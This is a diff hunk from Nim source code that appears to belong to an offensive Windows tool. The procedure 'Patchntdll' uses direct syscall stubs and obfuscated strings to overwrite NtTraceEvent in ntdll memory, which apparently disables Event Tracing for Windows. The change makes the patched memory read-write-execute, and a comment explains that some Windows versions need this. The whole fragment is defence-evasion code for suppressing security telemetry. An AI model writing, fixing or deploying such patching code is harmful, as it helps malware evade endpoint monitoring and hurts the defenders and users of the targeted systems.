@@ -538,7 +538,8 @@ proc Patchntdll(): bool =
         success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
         success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
         var friendlycodeLength = cast[SIZE_T](patch.len)
-        success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+        # READWRITE fails for NtTraceEvent, RWX is needed (Only some Windows Versions)
+        success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
         if (success != 0):
             echo obf("NtProtectVirtualMemory failed")
             break
